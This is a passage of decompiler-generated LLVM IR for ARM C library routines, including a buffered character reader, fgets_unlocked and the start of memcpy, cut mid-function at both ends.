  store i32 128, i32* @r1, align 4
  %v0_155ec = call i32 @__stdio_trans2r_o()
  store i32 %v0_155ec, i32* %r0.global-to-local, align 4
  %v2_155f0 = icmp eq i32 %v0_155ec, 0
  br i1 %v2_155f0, label %dec_label_pc_155e8.dec_label_pc_155f8_crit_edge, label %dec_label_pc_156c0

dec_label_pc_155e8.dec_label_pc_155f8_crit_edge:  ; preds = %dec_label_pc_155e8
  %v0_155f8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_155f8

dec_label_pc_155f8:                               ; preds = %dec_label_pc_155e8.dec_label_pc_155f8_crit_edge, %dec_label_pc_155d8
  %v2_15638 = phi i32 [ %v0_155f8.pre, %dec_label_pc_155e8.dec_label_pc_155f8_crit_edge ], [ %v0_155b0, %dec_label_pc_155d8 ]
  %v1_155f8 = inttoptr i32 %v2_15638 to i16*
  %v2_155f8 = load i16, i16* %v1_155f8, align 2
  %v3_155f8 = zext i16 %v2_155f8 to i32
  store i32 %v3_155f8, i32* %r2.global-to-local, align 4
  %v1_155fc = and i32 %v3_155f8, 2
  %v2_155fc = icmp eq i32 %v1_155fc, 0
  br i1 %v2_155fc, label %dec_label_pc_15628, label %dec_label_pc_15604

dec_label_pc_15604:                               ; preds = %dec_label_pc_155f8
  %tmp26 = urem i16 %v2_155f8, 2
  %v1_15604 = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_15604
  %v4_15608 = and i32 %tmp22, 4
  %v5_15608 = add i32 %v4_15608, %v2_15638
  %v1_1560c = add i32 %v5_15608, 36
  %v2_1560c = inttoptr i32 %v1_1560c to i8*
  %v3_1560c = load i8, i8* %v2_1560c, align 1
  %v4_1560c = zext i8 %v3_1560c to i32
  %v1_15610 = add nsw i32 %v3_155f8, -1
  store i32 %v1_15610, i32* %r2.global-to-local, align 4
  store i32 %v4_1560c, i32* %r0.global-to-local, align 4
  %v2_1561c = add i32 %v2_15638, 40
  %v3_1561c = inttoptr i32 %v2_1561c to i32*
  store i32 0, i32* %v3_1561c, align 4
  %v0_15620 = load i32, i32* %r2.global-to-local, align 4
  %v1_15620 = trunc i32 %v0_15620 to i16
  %v2_15620 = load i32, i32* @r4, align 4
  %v3_15620 = inttoptr i32 %v2_15620 to i16*
  store i16 %v1_15620, i16* %v3_15620, align 2
  br label %dec_label_pc_156c4

dec_label_pc_15628:                               ; preds = %dec_label_pc_155f8
  %v1_15628 = add i32 %v2_15638, 16
  %v1_1562c = inttoptr i32 %v1_15628 to i32*
  %v2_1562c = load i32, i32* %v1_1562c, align 4
  store i32 %v2_1562c, i32* @r1, align 4
  %v3_1562c = add i32 %v2_15638, 20
  %v4_1562c = inttoptr i32 %v3_1562c to i32*
  %v5_1562c = load i32, i32* %v4_1562c, align 4
  %v9_15630 = icmp eq i32 %v5_1562c, %v2_1562c
  br i1 %v9_15630, label %dec_label_pc_15640, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_15628
  %v2_15634 = inttoptr i32 %v2_1562c to i8*
  %v3_15634 = load i8, i8* %v2_15634, align 1
  %v4_15634 = zext i8 %v3_15634 to i32
  store i32 %v4_15634, i32* %r0.global-to-local, align 4
  %v6_15634 = add i32 %v2_1562c, 1
  store i32 %v6_15634, i32* @r1, align 4
  store i32 %v6_15634, i32* %v1_1562c, align 4
  br label %dec_label_pc_156c4

dec_label_pc_15640:                               ; preds = %dec_label_pc_15628
  %v1_15640 = add i32 %v2_15638, 4
  %v2_15640 = inttoptr i32 %v1_15640 to i32*
  %v3_15640 = load i32, i32* %v2_15640, align 4
  %v7_15644 = icmp eq i32 %v3_15640, -2
  br i1 %v7_15644, label %.thread7, label %dec_label_pc_15658

.thread7:                                         ; preds = %dec_label_pc_15640
  %v2_15648 = or i16 %v2_155f8, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_15648, i16* %v1_155f8, align 2
  br label %dec_label_pc_156c4

dec_label_pc_15658:                               ; preds = %dec_label_pc_15640
  %v1_15658 = and i32 %v3_155f8, 768
  %v2_15658 = icmp eq i32 %v1_15658, 0
  br i1 %v2_15658, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_15658
  %v1_15660 = load i32, i32* @r5, align 4
  %v3_15660 = add i32 %v1_15660, 76
  %v4_15660 = inttoptr i32 %v3_15660 to i32*
  %v5_15660 = load i32, i32* %v4_15660, align 4
  store i32 %v5_15660, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_15658, %bb23
  store i32 87656, i32* @lr, align 4
  %v1_15664 = xor i1 %v2_15658, true
  call void @__pseudo_cond_branch(i1 %v1_15664, i32 ptrtoint (i32* @global_var_15200.827 to i32))
  %v0_15668 = load i32, i32* @r4, align 4
  %v1_15668 = add i32 %v0_15668, 8
  store i32 %v1_15668, i32* %r2.global-to-local, align 4
  %v1_1566c = inttoptr i32 %v1_15668 to i32*
  %v2_1566c = load i32, i32* %v1_1566c, align 4
  store i32 %v2_1566c, i32* %r2.global-to-local, align 4
  %v3_1566c = add i32 %v0_15668, 12
  %v4_1566c = inttoptr i32 %v3_1566c to i32*
  %v5_1566c = load i32, i32* %v4_1566c, align 4
  %v9_15670 = icmp eq i32 %v5_1566c, %v2_1566c
  br i1 %v9_15670, label %dec_label_pc_156a4, label %dec_label_pc_15678

dec_label_pc_15678:                               ; preds = %.thread9
  %v2_15678 = add i32 %v0_15668, 24
  %v3_15678 = inttoptr i32 %v2_15678 to i32*
  store i32 %v2_1566c, i32* %v3_15678, align 4
  %v0_1567c = load i32, i32* @r4, align 4
  store i32 %v0_1567c, i32* %r0.global-to-local, align 4
  %v2_15680 = call i32 @__stdio_rfill(i32 %v0_1567c)
  store i32 %v2_15680, i32* %r0.global-to-local, align 4
  %v2_15684 = icmp eq i32 %v2_15680, 0
  br i1 %v2_15684, label %dec_label_pc_156c0, label %dec_label_pc_1568c

dec_label_pc_1568c:                               ; preds = %dec_label_pc_15678
  %v0_1568c = load i32, i32* @r4, align 4
  %v1_1568c = add i32 %v0_1568c, 20
  %v2_1568c = inttoptr i32 %v1_1568c to i32*
  %v3_1568c = load i32, i32* %v2_1568c, align 4
  %v2_15690 = add i32 %v0_1568c, 24
  %v3_15690 = inttoptr i32 %v2_15690 to i32*
  store i32 %v3_1568c, i32* %v3_15690, align 4
  %v0_15694 = load i32, i32* @r4, align 4
  %v1_15694 = add i32 %v0_15694, 16
  %v2_15694 = inttoptr i32 %v1_15694 to i32*
  %v3_15694 = load i32, i32* %v2_15694, align 4
  %v1_15698 = inttoptr i32 %v3_15694 to i8*
  %v2_15698 = load i8, i8* %v1_15698, align 1
  %v3_15698 = zext i8 %v2_15698 to i32
  store i32 %v3_15698, i32* %r0.global-to-local, align 4
  %v5_15698 = add i32 %v3_15694, 1
  store i32 %v5_15698, i32* %v2_15694, align 4
  br label %dec_label_pc_156c4

dec_label_pc_156a4:                               ; preds = %.thread9
  %v1_156a4 = inttoptr i32 %v0_15668 to i16*
  store i32 %v0_15668, i32* %r0.global-to-local, align 4
  %v2_156a8 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_156a8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_156b0 = call i32 @__stdio_READ(i16* %v1_156a4, i32 %v2_156a8, i32 1)
  store i32 %v5_156b0, i32* %r0.global-to-local, align 4
  %v2_156b4 = icmp eq i32 %v5_156b0, 0
  br i1 %v2_156b4, label %dec_label_pc_156c0, label %bb24

bb24:                                             ; preds = %dec_label_pc_156a4
  %v4_156b8 = load i8, i8* %stack_var_-17, align 1
  %v5_156b8 = sext i8 %v4_156b8 to i32
  store i32 %v5_156b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_156c4

dec_label_pc_156c0:                               ; preds = %dec_label_pc_156a4, %dec_label_pc_155e8, %dec_label_pc_15678
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_156c4

dec_label_pc_156c4:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_1568c, %dec_label_pc_15604, %dec_label_pc_156c0
  %v2_156c8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_156c8, i32* @r4, align 4
  store i32 %v6_155ac, i32* @r5, align 4
  store i32 %v9_155ac, i32* @lr, align 4
  %v1_156cc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_156cc

; uselistorder directives
  uselistorder i32 %v2_1562c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_15638, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_155b0, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i16 2, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_156c4, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_156c0, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_156d8 = load i32, i32* @r6, align 4
  %v12_156d8 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_156dc = icmp eq i32 %arg2, 0
  store i1 %v2_156dc, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_15764, label %dec_label_pc_1574c.preheader

dec_label_pc_1574c.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_1574c2 = add i32 %arg2, -1
  store i32 %v1_1574c2, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_1574c8 = icmp eq i32 %arg2, 1
  store i1 %v7_1574c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1574c8, label %dec_label_pc_15754, label %dec_label_pc_156f8

dec_label_pc_156f8:                               ; preds = %dec_label_pc_1574c.preheader, %dec_label_pc_1574c.backedge.dec_label_pc_156f8_crit_edge
  %v0_1571c = phi i32 [ %v0_156f8.pre, %dec_label_pc_1574c.backedge.dec_label_pc_156f8_crit_edge ], [ %arg3, %dec_label_pc_1574c.preheader ]
  %v1_156f8 = add i32 %v0_1571c, 16
  %v2_156f8 = inttoptr i32 %v1_156f8 to i32*
  %v3_156f8 = load i32, i32* %v2_156f8, align 4
  store i32 %v3_156f8, i32* %r2.global-to-local, align 4
  %v1_156fc = add i32 %v0_1571c, 24
  %v2_156fc = inttoptr i32 %v1_156fc to i32*
  %v3_156fc = load i32, i32* %v2_156fc, align 4
  store i32 %v3_156fc, i32* %r3.global-to-local, align 4
  %v3_15700 = icmp uge i32 %v3_156f8, %v3_156fc
  store i1 %v3_15700, i1* %cpsr_c.global-to-local, align 1
  %v9_15700 = icmp eq i32 %v3_156f8, %v3_156fc
  store i1 %v9_15700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15700, label %dec_label_pc_1571c, label %dec_label_pc_15708

dec_label_pc_15708:                               ; preds = %dec_label_pc_156f8
  %v1_15708 = inttoptr i32 %v3_156f8 to i8*
  %v2_15708 = load i8, i8* %v1_15708, align 1
  %v3_15708 = zext i8 %v2_15708 to i32
  store i32 %v3_15708, i32* %r3.global-to-local, align 4
  %v5_15708 = add i32 %v3_156f8, 1
  store i32 %v5_15708, i32* %r2.global-to-local, align 4
  %v2_1570c = load i32, i32* @r5, align 4
  %v3_1570c = inttoptr i32 %v2_1570c to i8*
  store i8 %v2_15708, i8* %v3_1570c, align 1
  %v4_1570c = load i32, i32* @r5, align 4
  %v5_1570c = add i32 %v4_1570c, 1
  store i32 %v5_1570c, i32* @r5, align 4
  %v0_15710 = load i32, i32* %r3.global-to-local, align 4
  %v2_15710 = icmp ugt i32 %v0_15710, 9
  store i1 %v2_15710, i1* %cpsr_c.global-to-local, align 1
  %v7_15710 = icmp eq i32 %v0_15710, 10
  store i1 %v7_15710, i1* %cpsr_z.global-to-local, align 1
  %v0_15714 = load i32, i32* %r2.global-to-local, align 4
  %v1_15714 = load i32, i32* @r4, align 4
  %v2_15714 = add i32 %v1_15714, 16
  %v3_15714 = inttoptr i32 %v2_15714 to i32*
  store i32 %v0_15714, i32* %v3_15714, align 4
  br i1 %v7_15710, label %dec_label_pc_15754, label %dec_label_pc_1574c.backedge

dec_label_pc_1571c:                               ; preds = %dec_label_pc_156f8
  %v1_1571c = inttoptr i32 %v0_1571c to i16*
  %v3_15720 = call i32 @getc_unlocked(i16* %v1_1571c)
  %v3_15724 = icmp eq i32 %v3_15720, -1
  store i1 %v3_15724, i1* %cpsr_c.global-to-local, align 1
  %v8_15724 = icmp eq i32 %v3_15720, -1
  store i1 %v8_15724, i1* %cpsr_z.global-to-local, align 1
  %v1_15728 = urem i32 %v3_15720, 256
  store i32 %v1_15728, i32* %r3.global-to-local, align 4
  br i1 %v3_15724, label %dec_label_pc_15730, label %dec_label_pc_15748

dec_label_pc_15730:                               ; preds = %dec_label_pc_1571c
  %v0_15730 = load i32, i32* @r4, align 4
  %v1_15730 = inttoptr i32 %v0_15730 to i16*
  %v2_15730 = load i16, i16* %v1_15730, align 2
  %v3_15730 = zext i16 %v2_15730 to i32
  store i32 %v3_15730, i32* %r3.global-to-local, align 4
  %v1_15734 = and i32 %v3_15730, 8
  %v2_15734 = icmp eq i32 %v1_15734, 0
  store i1 %v2_15734, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15734, label %dec_label_pc_15754, label %dec_label_pc_15764

dec_label_pc_15748:                               ; preds = %dec_label_pc_1571c
  %v1_15740 = trunc i32 %v3_15720 to i8
  %v2_15740 = load i32, i32* @r5, align 4
  %v3_15740 = inttoptr i32 %v2_15740 to i8*
  store i8 %v1_15740, i8* %v3_15740, align 1
  %v4_15740 = load i32, i32* @r5, align 4
  %v5_15740 = add i32 %v4_15740, 1
  store i32 %v5_15740, i32* @r5, align 4
  %v0_15744 = load i32, i32* %r3.global-to-local, align 4
  %v2_15744 = icmp ugt i32 %v0_15744, 9
  store i1 %v2_15744, i1* %cpsr_c.global-to-local, align 1
  %v7_15744 = icmp eq i32 %v0_15744, 10
  store i1 %v7_15744, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15744, label %dec_label_pc_15754, label %dec_label_pc_1574c.backedge

dec_label_pc_1574c.backedge:                      ; preds = %dec_label_pc_15748, %dec_label_pc_15708
  %v0_1574c = load i32, i32* @r6, align 4
  %v1_1574c = add i32 %v0_1574c, -1
  store i32 %v1_1574c, i32* @r6, align 4
  %v2_1574c = icmp ne i32 %v0_1574c, 0
  store i1 %v2_1574c, i1* %cpsr_c.global-to-local, align 1
  %v7_1574c = icmp eq i32 %v0_1574c, 1
  store i1 %v7_1574c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1574c, label %dec_label_pc_15754, label %dec_label_pc_1574c.backedge.dec_label_pc_156f8_crit_edge

dec_label_pc_1574c.backedge.dec_label_pc_156f8_crit_edge: ; preds = %dec_label_pc_1574c.backedge
  %v0_156f8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_156f8

dec_label_pc_15754:                               ; preds = %dec_label_pc_15748, %dec_label_pc_1574c.backedge, %dec_label_pc_15708, %dec_label_pc_1574c.preheader, %dec_label_pc_15730
  %v0_15754 = load i32, i32* @r5, align 4
  %v1_15754 = load i32, i32* @r7, align 4
  %v3_15754 = icmp uge i32 %v0_15754, %v1_15754
  store i1 %v3_15754, i1* %cpsr_c.global-to-local, align 1
  %v9_15754 = icmp eq i32 %v0_15754, %v1_15754
  store i1 %v9_15754, i1* %cpsr_z.global-to-local, align 1
  %v2_15758 = xor i1 %v9_15754, true
  %v3_15758 = and i1 %v3_15754, %v2_15758
  br i1 %v3_15758, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_15754
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_1575c = inttoptr i32 %v0_15754 to i8*
  store i8 0, i8* %v7_1575c, align 1
  %v0_15760.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_15760.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_15754, %bb
  %v1_15760 = phi i1 [ %v1_15760.pre, %bb ], [ %v9_15754, %dec_label_pc_15754 ]
  %v0_15760 = phi i1 [ %v0_15760.pre, %bb ], [ %v3_15754, %dec_label_pc_15754 ]
  %v2_15760 = xor i1 %v1_15760, true
  %v3_15760 = and i1 %v0_15760, %v2_15760
  br i1 %v3_15760, label %.dec_label_pc_15768_crit_edge, label %dec_label_pc_15764

.dec_label_pc_15768_crit_edge:                    ; preds = %.thread14
  %v0_15768.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15768

dec_label_pc_15764:                               ; preds = %entry, %dec_label_pc_15730, %.thread14
  br label %dec_label_pc_15768

dec_label_pc_15768:                               ; preds = %.dec_label_pc_15768_crit_edge, %dec_label_pc_15764
  %v0_15768 = phi i32 [ %v0_15768.pre, %.dec_label_pc_15768_crit_edge ], [ 0, %dec_label_pc_15764 ]
  store i32 %v9_156d8, i32* @r6, align 4
  store i32 %v12_156d8, i32* @r7, align 4
  ret i32 %v0_15768

; uselistorder directives
  uselistorder i1 %v9_15754, { 1, 0, 2 }
  uselistorder i32 %v1_15754, { 1, 0 }
  uselistorder i32 %v0_15754, { 0, 2, 1 }
  uselistorder i32 %v0_1574c, { 2, 0, 1 }
  uselistorder i32 %v0_15744, { 1, 0 }
  uselistorder i32 %v3_15720, { 2, 1, 0, 3 }
  uselistorder i32 %v0_15710, { 1, 0 }
  uselistorder i32 %v3_156f8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1571c, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_15768, { 1, 0 }
  uselistorder label %dec_label_pc_15764, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_15754, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_156f8, { 1, 0 }
}

define i32 @function_15778(i32 %arg1) local_unnamed_addr {
dec_label_pc_15778:
  ret i32 %arg1
}

define i32 @_memcpy() local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_15780 = load i32, i32* @r1, align 4
  %v1_15780 = load i32, i32* @r0, align 4
  %v2_15780 = sub i32 %v0_15780, %v1_15780
  %v3_15780 = icmp ult i32 %v0_15780, %v1_15780
  %v4_15780 = xor i32 %v1_15780, %v0_15780
  %v5_15780 = xor i32 %v2_15780, %v0_15780
  %v6_15780 = and i32 %v5_15780, %v4_15780
  %v7_15780 = icmp slt i32 %v6_15780, 0
  store i1 %v7_15780, i1* %cpsr_v.global-to-local, align 1
  %v8_15780 = icmp slt i32 %v2_15780, 0
  store i1 %v8_15780, i1* %cpsr_n.global-to-local, align 1
  %v9_15780 = icmp eq i32 %v0_15780, %v1_15780
  store i1 %v9_15780, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15780, label %dec_label_pc_159d4, label %dec_label_pc_15788

dec_label_pc_15788:                               ; preds = %entry
  br i1 %v9_15780, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_15788
  %merge = phi i32 [ %v0_15780, %dec_label_pc_15788 ], [ %v2_15a68, %bb150 ], [ %v11_15a84, %bb153 ], [ %v7_15a84, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_15788
  %v5_1578c = inttoptr i32 %v1_15780 to i8*
  store i8* %v5_1578c, i8** %stack_var_-8, align 4
  %v8_1578c = load i32, i32* @lr, align 4
  %v0_15790 = load i32, i32* @r2, align 4
  %v2_15790 = add i32 %v0_15790, -4
  store i32 %v2_15790, i32* %r2.global-to-local, align 4
  %v4_15790 = sub i32 3, %v0_15790
  %v5_15790 = and i32 %v4_15790, %v0_15790
  %v6_15790 = icmp slt i32 %v5_15790, 0
  store i1 %v6_15790, i1* %cpsr_v.global-to-local, align 1
  %v7_15790 = icmp slt i32 %v2_15790, 0
  store i1 %v7_15790, i1* %cpsr_n.global-to-local, align 1
  %v8_15790 = icmp eq i32 %v0_15790, 4
  store i1 %v8_15790, i1* %cpsr_z.global-to-local, align 1
  %v5_15794 = icmp slt i32 %v0_15790, 4
  br i1 %v5_15794, label %bb140, label %dec_label_pc_15798

dec_label_pc_15798:                               ; preds = %bb
  %v1_15798 = urem i32 %v1_15780, 4
  store i32 %v1_15798, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15798 = icmp eq i32 %v1_15798, 0
  store i1 %v2_15798, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15798, label %dec_label_pc_157a0, label %dec_label_pc_1584c

dec_label_pc_157a0:                               ; preds = %dec_label_pc_15798
  %v1_157a0 = urem i32 %v0_15780, 4
  store i32 %v1_157a0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_157a0 = icmp eq i32 %v1_157a0, 0
  store i1 %v2_157a0, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_15780 to i2
  br i1 %v2_157a0, label %dec_label_pc_157a8, label %dec_label_pc_1587c

dec_label_pc_157a8:                               ; preds = %dec_label_pc_157a0, %dec_label_pc_15874
  %v0_157c094 = phi i32 [ %v1_15780, %dec_label_pc_157a0 ], [ %v0_1599c77, %dec_label_pc_15874 ]
  %v0_157bc93 = phi i32 [ %v0_15780, %dec_label_pc_157a0 ], [ %v0_15874, %dec_label_pc_15874 ]
  %v0_157a8 = phi i32 [ %v2_15790, %dec_label_pc_157a0 ], [ %v2_1586c, %dec_label_pc_15874 ]
  %v1_157a8 = add i32 %v0_157a8, -8
  store i32 %v1_157a8, i32* %r2.global-to-local, align 4
  %v3_157a8 = sub i32 7, %v0_157a8
  %v4_157a8 = and i32 %v3_157a8, %v0_157a8
  %v5_157a8 = icmp slt i32 %v4_157a8, 0
  store i1 %v5_157a8, i1* %cpsr_v.global-to-local, align 1
  %v6_157a8 = icmp slt i32 %v1_157a8, 0
  store i1 %v6_157a8, i1* %cpsr_n.global-to-local, align 1
  %v7_157a8 = icmp eq i32 %v0_157a8, 8
  store i1 %v7_157a8, i1* %cpsr_z.global-to-local, align 1
  %v2_157ac = xor i1 %v6_157a8, %v5_157a8
  br i1 %v2_157ac, label %dec_label_pc_157fc, label %dec_label_pc_157b0

dec_label_pc_157b0:                               ; preds = %dec_label_pc_157a8
  %v1_157b0 = add i32 %v0_157a8, -28
  store i32 %v1_157b0, i32* %r2.global-to-local, align 4
  %v3_157b0 = sub i32 27, %v0_157a8
  %v4_157b0 = and i32 %v3_157b0, %v1_157a8
  %v5_157b0 = icmp slt i32 %v4_157b0, 0
  store i1 %v5_157b0, i1* %cpsr_v.global-to-local, align 1
  %v6_157b0 = icmp slt i32 %v1_157b0, 0
  store i1 %v6_157b0, i1* %cpsr_n.global-to-local, align 1
  %v7_157b0 = icmp eq i32 %v1_157a8, 20
  store i1 %v7_157b0, i1* %cpsr_z.global-to-local, align 1
  %v2_157b4 = xor i1 %v6_157b0, %v5_157b0
  br i1 %v2_157b4, label %dec_label_pc_157e8, label %dec_label_pc_157b8

dec_label_pc_157b8:                               ; preds = %dec_label_pc_157b0
  %v0_157b8 = load i32, i32* @r4, align 4
  store i32 %v0_157b8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_157bc

dec_label_pc_157bc:                               ; preds = %dec_label_pc_157bc.dec_label_pc_157bc_crit_edge, %dec_label_pc_157b8
  %v0_157c0 = phi i32 [ %v12_157c8, %dec_label_pc_157bc.dec_label_pc_157bc_crit_edge ], [ %v0_157c094, %dec_label_pc_157b8 ]
  %v0_157bc = phi i32 [ %v0_157bc.pre, %dec_label_pc_157bc.dec_label_pc_157bc_crit_edge ], [ %v0_157bc93, %dec_label_pc_157b8 ]
  %v1_157bc = inttoptr i32 %v0_157bc to i32*
  %v2_157bc = load i32, i32* %v1_157bc, align 4
  %v3_157bc = add i32 %v0_157bc, 4
  %v4_157bc = inttoptr i32 %v3_157bc to i32*
  %v5_157bc = load i32, i32* %v4_157bc, align 4
  store i32 %v5_157bc, i32* %r4.global-to-local, align 4
  %v6_157bc = add i32 %v0_157bc, 8
  %v7_157bc = inttoptr i32 %v6_157bc to i32*
  %v8_157bc = load i32, i32* %v7_157bc, align 4
  store i32 %v8_157bc, i32* %ip.global-to-local, align 4
  %v9_157bc = add i32 %v0_157bc, 12
  %v10_157bc = inttoptr i32 %v9_157bc to i32*
  %v11_157bc = load i32, i32* %v10_157bc, align 4
  store i32 %v11_157bc, i32* %lr.global-to-local, align 4
  %v12_157bc = add i32 %v0_157bc, 16
  store i32 %v12_157bc, i32* %r1.global-to-local, align 4
  %v1_157c0 = inttoptr i32 %v0_157c0 to i32*
  store i32 %v2_157bc, i32* %v1_157c0, align 4
  %v3_157c0 = add i32 %v0_157c0, 4
  %v4_157c0 = inttoptr i32 %v3_157c0 to i32*
  %v5_157c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_157c0, i32* %v4_157c0, align 4
  %v6_157c0 = add i32 %v0_157c0, 8
  %v7_157c0 = inttoptr i32 %v6_157c0 to i32*
  %v8_157c0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_157c0, i32* %v7_157c0, align 4
  %v9_157c0 = add i32 %v0_157c0, 12
  %v10_157c0 = inttoptr i32 %v9_157c0 to i32*
  %v11_157c0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_157c0, i32* %v10_157c0, align 4
  %v12_157c0 = add i32 %v0_157c0, 16
  store i32 %v12_157c0, i32* %r0.global-to-local, align 4
  %v0_157c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_157c4 = inttoptr i32 %v0_157c4 to i32*
  %v2_157c4 = load i32, i32* %v1_157c4, align 4
  store i32 %v2_157c4, i32* @r3, align 4
  %v3_157c4 = add i32 %v0_157c4, 4
  %v4_157c4 = inttoptr i32 %v3_157c4 to i32*
  %v5_157c4 = load i32, i32* %v4_157c4, align 4
  store i32 %v5_157c4, i32* %r4.global-to-local, align 4
  %v6_157c4 = add i32 %v0_157c4, 8
  %v7_157c4 = inttoptr i32 %v6_157c4 to i32*
  %v8_157c4 = load i32, i32* %v7_157c4, align 4
  store i32 %v8_157c4, i32* @ip, align 4
  %v9_157c4 = add i32 %v0_157c4, 12
  %v10_157c4 = inttoptr i32 %v9_157c4 to i32*
  %v11_157c4 = load i32, i32* %v10_157c4, align 4
  store i32 %v11_157c4, i32* %lr.global-to-local, align 4
  %v12_157c4 = add i32 %v0_157c4, 16
  store i32 %v12_157c4, i32* @r1, align 4
  %v1_157c8 = inttoptr i32 %v12_157c0 to i32*
  store i32 %v2_157c4, i32* %v1_157c8, align 4
  %v3_157c8 = add i32 %v0_157c0, 20
  %v4_157c8 = inttoptr i32 %v3_157c8 to i32*
  %v5_157c8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_157c8, i32* %v4_157c8, align 4
  %v6_157c8 = add i32 %v0_157c0, 24
  %v7_157c8 = inttoptr i32 %v6_157c8 to i32*
  %v8_157c8 = load i32, i32* @ip, align 4
  store i32 %v8_157c8, i32* %v7_157c8, align 4
  %v9_157c8 = add i32 %v0_157c0, 28
  %v10_157c8 = inttoptr i32 %v9_157c8 to i32*
  %v11_157c8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_157c8, i32* %v10_157c8, align 4
  %v12_157c8 = add i32 %v0_157c0, 32
  store i32 %v12_157c8, i32* @r0, align 4
  %v0_157cc = load i32, i32* %r2.global-to-local, align 4
  %v1_157cc = add i32 %v0_157cc, -32
  store i32 %v1_157cc, i32* %r2.global-to-local, align 4
  %v3_157cc = sub i32 31, %v0_157cc
  %v4_157cc = and i32 %v3_157cc, %v0_157cc
  %v5_157cc = icmp slt i32 %v4_157cc, 0
  %v6_157cc = icmp slt i32 %v1_157cc, 0
  %v2_157d0 = xor i1 %v6_157cc, %v5_157cc
  br i1 %v2_157d0, label %dec_label_pc_157d4, label %dec_label_pc_157bc.dec_label_pc_157bc_crit_edge

dec_label_pc_157bc.dec_label_pc_157bc_crit_edge:  ; preds = %dec_label_pc_157bc
  %v0_157bc.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_157bc

